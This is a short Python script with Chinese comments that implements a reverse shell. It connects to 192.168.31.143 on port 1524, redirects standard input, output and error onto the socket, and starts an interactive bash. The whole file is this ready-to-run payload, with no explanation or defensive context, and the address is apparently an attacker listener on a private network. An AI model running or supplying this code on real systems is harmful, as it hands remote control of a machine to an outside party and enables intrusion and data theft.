# coding:utf8
import os,socket,subprocess;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.31.143',1524))
#重定向shell输出
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
#执行子程序
p=subprocess.call(['/bin/bash','-i'])